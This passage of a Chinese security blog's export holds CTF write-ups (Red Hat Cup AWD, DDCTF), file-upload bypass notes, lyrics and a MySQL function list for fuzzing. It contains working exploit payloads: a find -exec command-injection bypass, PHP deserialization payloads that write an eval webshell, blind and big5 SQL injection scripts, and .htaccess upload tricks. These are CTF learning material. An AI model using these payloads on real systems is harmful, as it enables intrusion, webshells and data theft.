后记经过这次拍错发现自己对flask的实现机制产生了浓厚的兴趣。。。。那就立个flag，今年要把flask的源码好好看一看，至少弄懂flask背后的设计原理。","categories":[],"tags":[{"name":"技术学习","slug":"技术学习","permalink":"https://hexo.imagemlt.xyz/tags/技术学习/"}]},{"title":"红帽杯线下赛AWD题目分析","slug":"红帽杯线下赛AWD题目分析","date":"2018-06-03T07:37:47.000Z","updated":"2019-02-02T00:29:25.702Z","comments":true,"path":"post/红帽杯线下赛AWD题目分析/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/红帽杯线下赛AWD题目分析/index.html","excerpt":"","text":"红帽杯线下赛上周打了一场红帽杯的线下赛,可惜开具发挥失误服务器down了几轮一度垫底…最后才又勉强上了点儿分…..赛后对题目中的几处比较有意义的漏洞做了一下分析,写出了下面篇文章. 红帽杯线下赛web原题已同步到我社github上:https://github.com/susers/Writeups web1web1是一个wordpress的应用程序,可惜当时比赛刚开始时服务器上的权限设置并不能直接修复程序,所以就先去搞了web2.后来传了一个马上去才修复了一些权限的问题,其他的漏洞基本上是通过抓包来搞出来的….这里贴一些赛后看各路大佬writeup等感觉不错的漏洞点: 命令执行1 escapeshellcmd绕过在/wp-login.php中: 1234case 'debug': $file = addslashes($_POST['file']); system(\"find /tmp -iname \".escapeshellcmd($file)); break; 先看一下escapeshellcmd的说明: 可以看到escapeshellcmd的主要功能是对可以截断shell命令的字符进行转义. 然而这里的语句倍拼接到了find命令下,而find命令有一个参数是exec参数,可移执行命令,因此我们这里便可以利用find命令的exec参数来bypass. find exec参数执行的示例: 然而这里报缺少参数,是因为-exec传入的指令需要有结束符,分号必不可少,且分号应该加上反斜杠防止歧义. 这里看到命令被循环执行了,于是我们加上-quit只打印一次: 因此利用这样的指令便可以读文件.poc为: 1file=xxx -or -exec cat /flag ; quit 这里不加反斜杠是因为escapeshellcmd会给我们的参数自动加上反斜杠. 命令执行2在wp-includes/class-wp-cachefile.php中:12345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass Template &#123; public $cacheFile = '/tmp/cachefile'; public $template = '&lt;div&gt;Welcome back %s&lt;/div&gt;'; public function __construct($data = null) &#123; $data = $this-&gt;loadData($data); $this-&gt;render($data); &#125; public function loadData($data) &#123; if (substr($data, 0, 2) !== 'O:' &amp;&amp; !preg_match('/O:\\d:\\/', $data)) &#123; return unserialize($data); &#125; return []; &#125; public function createCache($file = null, $tpl = null) &#123; $file = $file ?? $this-&gt;cacheFile; $tpl = $tpl ?? $this-&gt;template; file_put_contents($file, $tpl); &#125; public function render($data) &#123; echo sprintf( $this-&gt;template, htmlspecialchars($data['name']) ); &#125; public function __destruct() &#123; $this-&gt;createCache(); &#125;&#125;new Template($_COOKIE['data']); 这里可以看到构造函数中调用了loadData来对传入的cookie值进行序列化,而loadData函数中对传入的参数进行了两个过滤: substr($data,0,2)!==’O:’可以通过序列化一个数组,数组中的元素为类来绕过. !preg_match(‘/O:\\d:\\/‘, $data)可以通过正号来绕过匹配. 在template类中的析构函数中调用了createCache方法,createCache方法中可以任意写入文件.因此构造payload的poc为: 1234567&lt;?phpclass Template &#123; public $cacheFile = './shell.php'; public $template = '&lt;?php eval($_REQUEST[test]);';&#125;$t=array(1=&gt;new Template());print_r(serialize($t)); 最后得到的符合条件的payload为:1a:1:&#123;i:1;O:+8:&quot;Template&quot;:2:&#123;s:9:&quot;cacheFile&quot;;s:11:&quot;./shell.php&quot;;s:8:&quot;template&quot;;s:28:&quot;&lt;?php eval($_REQUEST[test]);&quot;;&#125;&#125; 其他求他的洞就大概都是一些主办方预留的shell之类的了….. web2web2是一个finecms,当时防护做得比较好所以没有出现太多的问题. 命令执行1 /finecms/dayrui/config/config.class.php123456789101112131415161718192021222324252627282930313233343536373839&lt;?php$config = unserialize(base64_decode($config));if(isset($_GET['param']))&#123; $config-&gt;$_GET['param'];&#125;class FinecmsConfig&#123; private $config; private $path; public $filter; public function __construct($config=\"\")&#123; $this-&gt;config = $config; echo 123; &#125; public function getConfig()&#123; if($this-&gt;config == \"\")&#123; $config = isset($_POST['Finecmsconfig'])?$_POST['Finecmsconfig']:\"\"; &#125; &#125; public function SetFilter($value)&#123; if($this-&gt;filter)&#123; foreach($this-&gt;filter as $filter)&#123; $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value); &#125; $this-&gt;filter = array(); &#125;else&#123; return false; &#125; return true; &#125; public function __get($key)&#123; $this-&gt;SetFilter($key); die(\"\"); &#125;&#125; 这里可以看到调用$config-&gt;$_GET[param],如果$config是一个类且这个类不存在$_GET[param]这样一个属性就会调用__get()方法. 可以看到这里的FinecmsConfig类正好存在一个__get()方法.而在__get()方法中调用了SetFilter方法.在SetFilter方法中调用了call_user_func方法,因此这里存在命令执行漏洞. 全局搜索引用了config.class.php文件的文件,可以找到在./finecms/Init.php中存在引用,./finecms/Init.php中设置了$config变量: 1234if(isset($_COOKIE['FINECMS_CONFIG']))&#123; $config = $_COOKIE['FINECMS_CONFIG']; require FCPATH.'dayrui/config/config.class.php';&#125; 可以看到这里$config的值被设置为$_COOKIE[&#39;FINECMS_CONFIG&#39;]; 因此我们可以得出最后的payload: 12345678&lt;?php class FinecmsConfig&#123; private $config; private $path; public $filter=array('readfile');&#125;$c = new FinecmsConfig();print_r(base64_encode(serialize($c))); 得到cookie FINECMS_CONFIG的值:1TzoxMzoiRmluZWNtc0NvbmZpZyI6Mzp7czoyMToiAEZpbmVjbXNDb25maWcAY29uZmlnIjtOO3M6MTk6IgBGaW5lY21zQ29uZmlnAHBhdGgiO047czo2OiJmaWx0ZXIiO2E6MTp7aTowO3M6ODoicmVhZGZpbGUiO319 GET参数设置为/flag即可获取flag. 命令执行2finecms的一个1dayhttps://zhuanlan.zhihu.com/p/35133267http://lu4n.com/finecms-rce-0day/ sql注入梅子酒师傅之前挖到的一个sql注入的CVE: Finecms SQL注入漏洞 [CVE-2018-6893] 其他其他就是类似web1一样的小马之类的了….. 后记开始打awd之后这次比赛又回到了第一次打awd的感觉….只能说还是太菜了…..以后还是要多联系一下代码审计,真的佩服大佬们代码审计的能力. 另外题目中的漏洞点将会单独抽出来作为代码审计题目放到我校的CTF平台上供师傅们分析练习. 参考 http://skysec.top/2018/05/27/2018RedHat-AD-Web/ Finecms SQL注入漏洞 [CVE-2018-6893] https://zhuanlan.zhihu.com/p/35133267 http://lu4n.com/finecms-rce-0day/","categories":[{"name":"Ctf","slug":"Ctf","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/"},{"name":"web","slug":"Ctf/web","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/web/"}],"tags":[{"name":"Ctf","slug":"Ctf","permalink":"https://hexo.imagemlt.xyz/tags/Ctf/"}]},{"title":"纸短情长","slug":"wmj-2","date":"2018-05-21T15:55:35.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/wmj-2/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/wmj-2/index.html","excerpt":"","text":"你陪我步入蝉夏越过城市喧嚣歌声还在游走你榴花般的双眸不见你的温柔丢失花间欢笑岁月无法停留流云的等候我真的好想你在每一个雨季你选择遗忘的是我最不舍的纸短情长啊道不尽太多涟漪我的故事都是关于你呀怎么会爱上了她并决定跟她回家放弃了我的所有我的一切无所谓纸短情长啊诉不完当时年少我的故事还是关于你呀你陪我步入蝉夏越过城市喧嚣歌声还在游走你榴花般的双眸不见你的温柔丢失花间欢笑岁月无法停留流云的等候我真的好想你在每一个雨季你选择遗忘的是我最不舍的纸短情长啊道不尽太多涟漪我的故事都是关于你呀怎么会爱上了她并决定跟她回家放弃了我的所有我的一切无所谓纸短情长啊诉不完当时年少我的故事还是关于你呀我真的好想你在每一个雨季你选择遗忘的是我最不舍的纸短情长啊道不尽太多涟漪我的故事都是关于你呀怎么会爱上了她并决定跟她回家放弃了我的所有我的一切无所谓纸短情长啊诉不完当时年少我的故事还是关于你呀我的故事还是关于你呀","categories":[{"name":"人生杂谈","slug":"人生杂谈","permalink":"https://hexo.imagemlt.xyz/categories/人生杂谈/"}],"tags":[]},{"title":"文件上传漏洞的总结","slug":"file-upload-attacks","date":"2018-04-23T16:37:10.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/file-upload-attacks/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/file-upload-attacks/index.html","excerpt":"","text":"防御文件上传的一些思路 客户端javascript校验（通常校验扩展名） 检查文件扩展名 检查MIME类型 随机文件名 隐藏路径 重写内容（影响效率）imagecreatefromjpeg… 检查内容是否合法 绕过技巧 $_FILES[‘file’][‘type’]:burp抓包可修改 内容检查： &lt;script language=“php”&gt;&lt;/script&gt; 文件名拓展检查：黑名单绕过 ○ Php3 php5 phtml PPHP pHp phtm inc ○ Jsp jspx jspf ○ Asp asa cer aspx ○ Exe exee ○ 后缀名加空格 ○ 00截断 ○ 双重后缀名绕过 常配合文件包含漏洞达到特殊效果 通过比较gd函数处理前后的文件找到不产生变化的区块写入特殊的payloadhttp://www.freebuf.com/articles/web/54086.html phpinfo+lfi htaccess攻击 AddType application/x-httpd-php .jpg &lt;FilesMatch &quot;95zz.gif&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; opcache文件getshell(利用phpinfo获得缓存目录后上传shell)https://www.exehack.net/3272.html 如果内存缓存的优先级高于文件缓存，那么重写opcache文件并不会执行我们的webshell 开启了validate_timestamp的绕过: Wordpress某些文件时间戳一样 opcache-override 文件头检测方法：将木马后缀到文件末(常见的是通过getimagesize()函数) file_put_contents 数组绕过 当代码中存在spl_autoload_register()函数时可以上传.inc文件(laravel、composer中常用)(湖湘杯) spl_autoload_register()函数使用后将会自动调用inc文件 move_uploaded_file() 名称可控时可上传至任意位置，aaaa/../index.php/.绕过后缀名检测 上传模板文件 上传绕过 parse_url函数可以通过多个斜杠来绕过","categories":[{"name":"人生杂谈","slug":"人生杂谈","permalink":"https://hexo.imagemlt.xyz/categories/人生杂谈/"}],"tags":[]},{"title":"DDCTF writeup","slug":"ddctf-writeup","date":"2018-04-22T14:55:12.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/ddctf-writeup/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/ddctf-writeup/index.html","excerpt":"","text":"Misc签到题公告 (╯°□°）╯︵ ┻━┻将字符串base64解码后再凯撒移位即可获得flag. 第四扩展fsbinwalk 可从图片中获得一个压缩包，图片右击属性里面详细信息-备注可获得压缩包密码为Pactera,解压压缩包后获得一个文本文件,复制内容进行字频统计即可获得flag在线字词频率统计 流量分析协议分级，看到有ftp协议、stmp协议，stmp协议中有一个base64后的图片，提取该图片并解码可以发现一串字符串，经题目提示可知为一个私钥文件，用ocr软件提取后并修改错误补全格式，wireshark中导入即可看到最后的部分解密出一个http封包，内容中可以获得flag。 安全通信利用aes_ecb分组加密的特点，而且generate_hello中的message长度可控，所以可以按位爆破flag. poc: 1234567891011121314151617181920212223242526272829303132333435363738import socketmission_key=\"2acba569d223cf7d6e48dee88378288a\"begin=24ans=\"\"while True: f=socket.socket(socket.AF_INET,socket.SOCK_STREAM) f.connect((\"116.85.48.103\",5002)) print f.recv(1024) f.send(mission_key+\"\\n\") print f.recv(1024) f.send('a'*begin+\"\\n\") crypt=f.recv(1024) data=f.recv(1024) print crypt,data,begin,((len(ans)/16)+1)*32 querystring='&#123;&#125;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM' i=0 while i&lt;len(querystring): f.send(querystring[i]+ans+\"\\n\") info=f.recv(1024).split() #print querystring[i] try: data=info[0] except: continue #print info,data,-(((len(ans)/32)+1)*32+1),crypt[-((len(ans)/32)+1)*32-1:-1] if(crypt[-((len(ans)/16)+1)*32-1:-1]==data): print \"mark\" ans=querystring[i]+ans print ans begin=begin+1 break data=f.recv(1024) #print \"[+]\"+data i=i+1 print \"================data is &#123;&#125; end a loop\".format(ans) WEB数据库的秘密盲注，里面的js加密算法懒得看所以直接用nodejs编写盲注脚本，导入网页中引入的math.js用于加密,脚本如下: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788 var http=require('http'); var querystring=require('querystring'); var math=require('./math'); var cheerio=require(\"cheerio\"); var key=\"adrefkfweodfsdpiru\"; function signGenerate(obj, key) &#123; var str0 = ''; for (var i in obj) &#123; if (i != 'sign') &#123; str1 = ''; str1 = i + '=' + obj[i]; str0 += str1 &#125; &#125; return math(str0 + key) &#125;; var request=function(options,postData) &#123; return new Promise((resolve)=&gt; &#123; var data=\"\"; var req = http.request(options, function (res) &#123; res.on(\"data\", function (chunk) &#123; data+=chunk.toString(); &#125;); res.on(\"end\", function () &#123; //console.log(\"data emitted successfully\"); resolve(data); &#125;); //console.log(res.statusCode); &#125;); req.on(\"error\", function (err) &#123; //console.log(err, message); &#125;) req.write(postData); req.end(); &#125;); &#125; async function main()&#123; ans=''; ll=0; for(var i=1;i&lt;128;i++)&#123; for(var j=1;j&lt;128;j++) &#123; var obj = &#123; id: '', title: 'ctf', author: \"' and ascii(mid((select secvalue from ctf_key1),\" + i + \",1))-\" + j + \"#\", date: '', time: parseInt(new Date().getTime() / 1000) &#125;; //console.log(obj.author); //console.log(obj); var sign = signGenerate(obj, key); var options = &#123; hostname: '116.85.43.88', method: 'POST', port: 8080, path: '/PEQFGTUTQMZWCZGK/dfe3ia/index.php?' + querystring.stringify(&#123;'sig': sign, 'time': obj.time&#125;), headers: &#123; 'X-Forwarded-For': '123.232.23.245', 'Content-Type': 'application/x-www-form-urlencoded' &#125; &#125; var data = await request(options, querystring.stringify(obj)); //console.log(data);break; var $ = cheerio.load(data); if($('tr').length==0)console.log(data); //console.log($('tr').length); if ($('tr').length == 3)&#123; ans = ans + String.fromCharCode(j);break&#125; &#125; console.log('[+]'+ans); if(j==128)break; &#125; &#125; main();``` 其中math.js即为网页中的math.js,最后一行添加：```js module.exports=hex_math_enc; 专属链接文件包含漏洞，而且通过报错界面可获得类名称，因此可以获得.class文件，这里贴一下获得的一些比较重要的源码: InitListener.java // Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov. // Jad home page: http://www.geocities.com/kpdus/jad.html // Decompiler options: packimports(3) // Source File Name: InitListener.java package com.didichuxing.ctf.listener; import com.didichuxing.ctf.model.Flag; import com.didichuxing.ctf.service.FlagService; import java.io.*; import java.security.*; import java.security.cert.CertificateException; import java.util.Properties; import java.util.UUID; import javax.crypto.*; import javax.crypto.spec.SecretKeySpec; import javax.servlet.ServletContext; import org.apache.commons.io.FileUtils; import org.springframework.beans.factory.InitializingBean; import org.springframework.context.*; import org.springframework.web.context.WebApplicationContext; public class InitListener implements ApplicationListener, InitializingBean { public InitListener() { properties = new Properties(); } public void afterPropertiesSet() throws Exception { System.out.println(\"afterPropertiesSet\"); try { java.io.InputStream inputStream = getClass().getClassLoader().getResourceAsStream(\"/properties/conf.properties\"); properties.load(inputStream); } catch(Exception e) { e.printStackTrace(); } p = \"sdl welcome you !\".substring(0, \"sdl welcome you !\".length() - 1).trim().replace(\" \", \"\"); } public void onApplicationEvent(ApplicationEvent event) { if(!(event.getSource() instanceof ApplicationContext)) return; WebApplicationContext ctx = (WebApplicationContext)event.getSource(); if(ctx.getParent() != null) return; String regenflag = properties.getProperty(\"regenflag\"); if(regenflag != null &amp;&amp; \"false\".equals(regenflag)) { System.out.println(\"skip gen flag\"); return; } try { flagService.deleteAll(); int id = 1; String path = ctx.getServletContext().getRealPath(\"/WEB-INF/classes/emails.txt\"); String ksPath = ctx.getServletContext().getRealPath(\"/WEB-INF/classes/sdl.ks\"); System.out.println(path); String emailsString = FileUtils.readFileToString(new File(path), \"utf-8\"); String emails[] = emailsString.trim().split(\"\\n\"); KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType()); FileInputStream inputStream = new FileInputStream(ksPath); keyStore.load(inputStream, p.toCharArray()); Key key = keyStore.getKey(\"www.didichuxing.com\", p.toCharArray()); Cipher cipher = Cipher.getInstance(key.getAlgorithm()); cipher.init(1, key); SecretKeySpec signingKey = new SecretKeySpec(\"sdl welcome you !\".getBytes(), \"HmacSHA256\"); Mac mac = Mac.getInstance(\"HmacSHA256\"); mac.init(signingKey); SecureRandom sr = new SecureRandom(); String as[] = emails; int i = as.length; for(int j = 0; j &lt; i; j++) { String email = as[j]; String flag = (new StringBuilder()).append(\"DDCTF{\").append(Math.abs(sr.nextLong())).append(\"}\").toString(); String uuid = UUID.randomUUID().toString().replace(\"-\", \"s\"); byte data[] = cipher.doFinal(flag.getBytes()); byte e[] = mac.doFinal(String.valueOf(email.trim()).getBytes()); Flag flago = new Flag(); flago.setId(Integer.valueOf(id)); flago.setFlag(byte2hex(data)); flago.setEmail(byte2hex(e)); flago.setOriginFlag(flag); flago.setUuid(uuid); flago.setOriginEmail(email); flagService.save(flago); System.out.println((new StringBuilder()).append(email).append(\"\\u540C\\u5B66\\u7684\\u5165\\u53E3\\u94FE\\u63A5\\u4E3A\\uFF1Ahttp://116.85.48.102:5050/welcom/\").append(uuid).toString()); id++; System.out.println(flago); } } catch(KeyStoreException e) { e.printStackTrace(); } catch(IOException e) { e.printStackTrace(); } catch(NoSuchAlgorithmException e) { e.printStackTrace(); } catch(CertificateException e) { e.printStackTrace(); } catch(UnrecoverableKeyException e) { e.printStackTrace(); } catch(NoSuchPaddingException e) { e.printStackTrace(); } catch(InvalidKeyException e) { e.printStackTrace(); } catch(IllegalBlockSizeException e) { e.printStackTrace(); } catch(BadPaddingException e) { e.printStackTrace(); } } public static String byte2hex(byte b[]) { StringBuilder hs = new StringBuilder(); for(int n = 0; b != null &amp;&amp; n &lt; b.length; n++) { String stmp = Integer.toHexString(b[n] &amp; 0xff); if(stmp.length() == 1) hs.append('0'); hs.append(stmp); } return hs.toString().toUpperCase(); } final String k = \"sdl welcome you !\"; private FlagService flagService; private Properties properties; private String p; } FlagController.java package com.didichuxing.ctf.controller.user; import com.didichuxing.ctf.model.Flag; import com.didichuxing.ctf.service.FlagService; import java.io.PrintStream; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.ui.ModelMap; import org.springframework.web.bind.annotation.PathVariable; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; @RestController @RequestMapping({\"flag\"}) public class FlagController { @Autowired private FlagService flagService; public FlagController() {} @RequestMapping(value={\"/getflag/{email:[0-9a-zA-Z']+}\"}, method={org.springframework.web.bind.annotation.RequestMethod.POST}) public String getFlag(@PathVariable(\"email\") String email, ModelMap model) { Flag flag = flagService.getFlagByEmail(email); return \"Encrypted flag : \" + flag.getFlag(); } @RequestMapping({\"/testflag/{flag}\"}) public String submitFlag(@PathVariable(\"flag\") String flag, ModelMap model) { String[] fs = flag.split(\"[{}]\"); Long longFlag = Long.valueOf(fs[1]); int i = flagService.exist(flag); if (i &gt; 0) { return \"pass!!!\"; } return \"failed!!!\"; } private void init() { System.out.println(\"test\"); } } 可以看到在数据库中保存了SHA256后的email和RSA加密后的flag，而FlagController提供了利用加密后的email获取加密后的flag的接口。猜测这里的email为主页上联系方式处的email:**8071103253958342134@didichuxing.com**。将email加密后获取到flag，使用以下java代码来解密: package com.company; import javax.crypto.Cipher; import java.io.File; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.IOException; import java.security.*; import java.security.cert.Certificate; public class Main { public static void main(String[] args) { // write your code here try { FileInputStream str = new FileInputStream(new File(\"/tmp/xxx.xx\")); String p = \"sdl welcome you !\".substring(0, \"sdl welcome you !\".length() - 1).trim().replace(\" \", \"\"); KeyStore keystore=KeyStore.getInstance(KeyStore.getDefaultType()); FileInputStream input=new FileInputStream(\"/tmp/sdl.ks\"); keystore.load(input,p.toCharArray()); Key key=keystore.getKey(\"www.didichuxing.com\", p.toCharArray()); Certificate cert=keystore.getCertificate(\"www.didichuxing.com\"); PublicKey publicKey=cert.getPublicKey(); Cipher cipher=Cipher.getInstance(key.getAlgorithm()); System.out.println(Cipher.DECRYPT_MODE); System.out.println(Cipher.ENCRYPT_MODE); cipher.init(Cipher.DECRYPT_MODE,publicKey); byte m[]=str.readAllBytes(); System.out.println(m); byte data[]=cipher.doFinal(m); System.out.println(new String(data)); } catch(Exception e){ e.printStackTrace(); } } } 其中 /tmp/sdl.ks是通过文件包含漏洞读取到的ketstore文件，包含公钥与私钥信息，/tmp/xxx.xx保存加密后的flag. 解密后获得flag. 注入的奥妙首先是sql注入，页面提示后端数据库的编码是big5编码，因此从big5编码表中找到5c结尾的汉字即可绕过add_slashes;其中关键字过滤可以用双写来绕过，最终的获取route_rules表的内容的payload为: http://116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/well/getmessage/1%E5%85%9D&apos;%20and%200%20uniounionn%20select%20pattern,action,rulepass%20%20from%20route_rules%23 中间暴库时需要转换编码 convert(xxx using big5) 获取到路由规则表的内容: action pattern type get*/ u/well/getmessage/ s get*/ u/justtry/self/ s post*/ u/justtry/try JustTry#try static/bootstrap/css/backup.css static/bootstrap/css/backup.zip 访问static/boostrap/css/backup.css,可获取网页的所有源码，可以看到justtry/try处为反序列化，可以利用这里的反序列化反序列化test类即可获取flag. 生成反序列化脚本的payload为: &lt;?php namespace Index\\Helper; class Flag{ public $sql; } class Test{ public $user_uuid; public $fl; } class SQL{ public $dbc; public $pdo; } $fl=new Flag; $fl-&gt;sql=new SQL; $test=new Test; $test-&gt;user_uuid=\"c38639ed-2d7f-41bd-a412-4c489de8102e\"; $test-&gt;fl=$fl; print_r(serialize($test)); mini-blockchain解题思路:利用create_transaction在头区块后生成一条更长的链覆盖原来的链从而覆盖给黑客的交易记录，然后再利用backdoor给超市转10000，获得一个diamound;然后再将现在这条链覆盖，再利用backdoor给超市转10000，又可以获得一个flag. 添加新区块需要满足新区块的hash少于DIFFICULTY，这里使用所有数字组合来爆破。插入的区块中transaction数组为空，意味着不包含任何交易记录，这样既可避免获取私钥。 爆破新区块的脚本为: def deal(head): global session print session DIFFICULTY = int('00000' + 'f' * 59, 16) print DIFFICULTY i=0 while True: transferred = create_tx([], []) #print head new_block = create_block(str(head), str(i), []) #print new_block if int(new_block['hash'],16)&lt;DIFFICULTY: print json.dumps(new_block) i=i+1 #print new_block #print \"hash\",int(new_block['hash'],16) deal(sys.argv[1]) 每次运行将想要插入的位置的hash作为参数,即可生成一个没有交易的空区块，当新生成的链长度大于原有链长度即可覆盖原有的链。","categories":[{"name":"人生杂谈","slug":"人生杂谈","permalink":"https://hexo.imagemlt.xyz/categories/人生杂谈/"}],"tags":[]},{"title":"mysql中的所有函数汇总（Fuzz用）","slug":"mysql-functions","date":"2018-04-15T14:04:35.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/mysql-functions/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/mysql-functions/index.html","excerpt":"","text":"[u&apos;ABS()&apos;, u&apos;ACOS()&apos;, u&apos;ADDDATE()&apos;, u&apos;ADDTIME()&apos;, u&apos;AES_DECRYPT()&apos;, u&apos;AES_ENCRYPT()&apos;, u&apos;AND, &amp;&amp;&apos;, u&apos;Area()&apos;, u&apos;AsBinary(), AsWKB()&apos;, u&apos;ASCII()&apos;, u&apos;ASIN()&apos;, u&apos;=&apos;, u&apos;:=&apos;, u&apos;AsText(), AsWKT()&apos;, u&apos;ATAN()&apos;, u&apos;ATAN2(), ATAN()&apos;, u&apos;AVG()&apos;, u&apos;BENCHMARK()&apos;, u&apos;BETWEEN ... AND ...&apos;, u&apos;BIN()&apos;, u&apos;BINARY&apos;, u&apos;BIT_AND()&apos;, u&apos;BIT_COUNT()&apos;, u&apos;BIT_LENGTH()&apos;, u&apos;BIT_OR()&apos;, u&apos;BIT_XOR()&apos;, u&apos;&amp;&apos;, u&apos;~&apos;, u&apos;|&apos;, u&apos;^&apos;, u&apos;CASE&apos;, u&apos;CAST()&apos;, u&apos;CEIL()&apos;, u&apos;CEILING()&apos;, u&apos;Centroid()&apos;, u&apos;CHAR()&apos;, u&apos;CHAR_LENGTH()&apos;, u&apos;CHARACTER_LENGTH()&apos;, u&apos;CHARSET()&apos;, u&apos;COALESCE()&apos;, u&apos;COERCIBILITY()&apos;, u&apos;COLLATION()&apos;, u&apos;COMPRESS()&apos;, u&apos;CONCAT()&apos;, u&apos;CONCAT_WS()&apos;, u&apos;CONNECTION_ID()&apos;, u&apos;Contains()&apos;, u&apos;CONV()&apos;, u&apos;CONVERT()&apos;, u&apos;CONVERT_TZ()&apos;, u&apos;COS()&apos;, u&apos;COT()&apos;, u&apos;COUNT()&apos;, u&apos;COUNT(DISTINCT)&apos;, u&apos;CRC32()&apos;, u&apos;Crosses()&apos;, u&apos;CURDATE()&apos;, u&apos;CURRENT_DATE(), CURRENT_DATE&apos;, u&apos;CURRENT_TIME(), CURRENT_TIME&apos;, u&apos;CURRENT_TIMESTAMP(), CURRENT_TIMESTAMP&apos;, u&apos;CURRENT_USER(), CURRENT_USER&apos;, u&apos;CURTIME()&apos;, u&apos;DATABASE()&apos;, u&apos;DATE()&apos;, u&apos;DATE_ADD()&apos;, u&apos;DATE_FORMAT()&apos;, u&apos;DATE_SUB()&apos;, u&apos;DATEDIFF()&apos;, u&apos;DAY()&apos;, u&apos;DAYNAME()&apos;, u&apos;DAYOFMONTH()&apos;, u&apos;DAYOFWEEK()&apos;, u&apos;DAYOFYEAR()&apos;, u&apos;DECODE()&apos;, u&apos;DEFAULT()&apos;, u&apos;DEGREES()&apos;, u&apos;DES_DECRYPT()&apos;, u&apos;DES_ENCRYPT()&apos;, u&apos;Dimension()&apos;, u&apos;Disjoint()&apos;, u&apos;DIV&apos;, u&apos;/&apos;, u&apos;ELT()&apos;, u&apos;ENCODE()&apos;, u&apos;ENCRYPT()&apos;, u&apos;EndPoint()&apos;, u&apos;Envelope()&apos;, u&apos;=&apos;, u&apos;&lt;=&gt;&apos;, u&apos;Equals()&apos;, u&apos;EXP()&apos;, u&apos;EXPORT_SET()&apos;, u&apos;ExteriorRing()&apos;, u&apos;EXTRACT()&apos;, u&apos;ExtractValue()&apos;, u&apos;FIELD()&apos;, u&apos;FIND_IN_SET()&apos;, u&apos;FLOOR()&apos;, u&apos;FORMAT()&apos;, u&apos;FOUND_ROWS()&apos;, u&apos;FROM_DAYS()&apos;, u&apos;FROM_UNIXTIME()&apos;, u&apos;GeomCollFromText(), GeometryCollectionFromText()&apos;, u&apos;GeomCollFromWKB(), GeometryCollectionFromWKB()&apos;, u&apos;GeometryCollection()&apos;, u&apos;GeometryN()&apos;, u&apos;GeometryType()&apos;, u&apos;GeomFromText(), GeometryFromText()&apos;, u&apos;GeomFromWKB(), GeometryFromWKB()&apos;, u&apos;GET_FORMAT()&apos;, u&apos;GET_LOCK()&apos;, u&apos;GLength()&apos;, u&apos;&gt;&apos;, u&apos;&gt;=&apos;, u&apos;GREATEST()&apos;, u&apos;GROUP_CONCAT()&apos;, u&apos;HEX()&apos;, u&apos;HOUR()&apos;, u&apos;IF()&apos;, u&apos;IFNULL()&apos;, u&apos;IN()&apos;, u&apos;INET_ATON()&apos;, u&apos;INET_NTOA()&apos;, u&apos;INSERT()&apos;, u&apos;INSTR()&apos;, u&apos;InteriorRingN()&apos;, u&apos;Intersects()&apos;, u&apos;INTERVAL()&apos;, u&apos;IS&apos;, u&apos;IS_FREE_LOCK()&apos;, u&apos;IS NOT&apos;, u&apos;IS NOT NULL&apos;, u&apos;IS NULL&apos;, u&apos;IS_USED_LOCK()&apos;, u&apos;IsClosed()&apos;, u&apos;IsEmpty()&apos;, u&apos;ISNULL()&apos;, u&apos;IsSimple()&apos;, u&apos;LAST_DAY&apos;, u&apos;LAST_INSERT_ID()&apos;, u&apos;LCASE()&apos;, u&apos;LEAST()&apos;, u&apos;LEFT()&apos;, u&apos;&lt;&lt;&apos;, u&apos;LENGTH()&apos;, u&apos;&lt;&apos;, u&apos;&lt;=&apos;, u&apos;LIKE&apos;, u&apos;LineFromText(), LineStringFromText()&apos;, u&apos;LineFromWKB(), LineStringFromWKB()&apos;, u&apos;LineString()&apos;, u&apos;LN()&apos;, u&apos;LOAD_FILE()&apos;, u&apos;LOCALTIME(), LOCALTIME&apos;, u&apos;LOCALTIMESTAMP, LOCALTIMESTAMP()&apos;, u&apos;LOCATE()&apos;, u&apos;LOG()&apos;, u&apos;LOG10()&apos;, u&apos;LOG2()&apos;, u&apos;LOWER()&apos;, u&apos;LPAD()&apos;, u&apos;LTRIM()&apos;, u&apos;MAKE_SET()&apos;, u&apos;MAKEDATE()&apos;, u&apos;MAKETIME()&apos;, u&apos;MASTER_POS_WAIT()&apos;, u&apos;MATCH&apos;, u&apos;MAX()&apos;, u&apos;MBRContains()&apos;, u&apos;MBRDisjoint()&apos;, u&apos;MBREqual()&apos;, u&apos;MBRIntersects()&apos;, u&apos;MBROverlaps()&apos;, u&apos;MBRTouches()&apos;, u&apos;MBRWithin()&apos;, u&apos;MD5()&apos;, u&apos;MICROSECOND()&apos;, u&apos;MID()&apos;, u&apos;MIN()&apos;, u&apos;-&apos;, u&apos;MINUTE()&apos;, u&apos;MLineFromText(), MultiLineStringFromText()&apos;, u&apos;MLineFromWKB(), MultiLineStringFromWKB()&apos;, u&apos;MOD()&apos;, u&apos;%, MOD&apos;, u&apos;MONTH()&apos;, u&apos;MONTHNAME()&apos;, u&apos;MPointFromText(), MultiPointFromText()&apos;, u&apos;MPointFromWKB(), MultiPointFromWKB()&apos;, u&apos;MPolyFromText(), MultiPolygonFromText()&apos;, u&apos;MPolyFromWKB(), MultiPolygonFromWKB()&apos;, u&apos;MultiLineString()&apos;, u&apos;MultiPoint()&apos;, u&apos;MultiPolygon()&apos;, u&apos;NAME_CONST()&apos;, u&apos;NOT, !&apos;, 